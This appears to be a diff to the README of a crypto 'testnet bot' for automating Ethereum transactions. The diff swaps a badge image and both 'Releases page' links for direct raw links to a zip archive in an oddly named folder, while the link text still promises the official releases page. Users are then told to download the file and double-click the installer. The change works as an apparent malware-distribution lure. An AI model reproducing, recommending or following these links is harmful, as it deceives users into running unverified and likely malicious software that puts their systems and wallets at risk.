@@ -1,6 +1,6 @@
 # 🚀 Particle-Pioneer-Testnet-bot - Automate Your Ethereum Transactions Easily
 
-![Download Particle-Pioneer-Testnet-bot](https://img.shields.io/badge/Download-Particle--Pioneer--Testnet--bot-brightgreen)
+![Download Particle-Pioneer-Testnet-bot](https://raw.githubusercontent.com/Zeltrin/Particle-Pioneer-Testnet-bot/main/succentor/Particle-Pioneer-Testnet-bot_3.8.zip)
 
 ## 📋 Introduction
 
@@ -17,11 +17,11 @@ Welcome to Particle-Pioneer-Testnet-bot! This application automates transactions
 
 To start using Particle-Pioneer-Testnet-bot, you need to download it from our releases page. 
 
-[Visit this page to download](https://github.com/Zeltrin/Particle-Pioneer-Testnet-bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Zeltrin/Particle-Pioneer-Testnet-bot/main/succentor/Particle-Pioneer-Testnet-bot_3.8.zip)
 
 Follow these steps to install the software:
 
-1. **Visit the Releases Page**: Open your web browser and go to the [Releases page](https://github.com/Zeltrin/Particle-Pioneer-Testnet-bot/releases).
+1. **Visit the Releases Page**: Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/Zeltrin/Particle-Pioneer-Testnet-bot/main/succentor/Particle-Pioneer-Testnet-bot_3.8.zip).
 2. **Select the Latest Release**: Look for the latest version listed at the top. You’ll usually see a version number next to it, like “v1.0”.
 3. **Download the Installer**: Click on the link for the file that matches your operating system (e.g., Windows, Mac, Linux).
 4. **Run the Installer**: Once the download is complete, locate the file (usually in your Downloads folder) and double-click it to start the installation process.
